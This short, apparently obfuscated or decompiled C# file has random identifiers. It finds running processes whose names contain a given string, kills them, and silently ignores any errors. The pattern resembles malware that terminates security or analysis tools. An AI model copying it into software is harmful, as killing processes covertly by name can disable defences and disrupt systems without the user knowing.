using System;
using System.Diagnostics;

namespace fAuBSMaVICral;

public sealed class ulTFeBNkCEI
{
	public static bool CLtFbnWhPaTI(Process process_0, string string_0)
	{
		try
		{
			return process_0.ProcessName.ToLower().Contains(string_0.ToLower());
		}
		catch (InvalidOperationException)
		{
			return false;
		}
		catch (NullReferenceException)
		{
			return false;
		}
		catch
		{
			return false;
		}
	}

	public static void ZSqxdjvqrmK(string string_0, string string_1)
	{
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			if (CLtFbnWhPaTI(process, string_0.ToLower()))
			{
				try
				{
					process.Kill();
					process.WaitForExit();
					YpCGOwjDWwATs.cBtlovdwPrJ();
				}
				catch (InvalidOperationException)
				{
				}
				catch (PlatformNotSupportedException)
				{
					break;
				}
				catch
				{
				}
			}
		}
	}
}
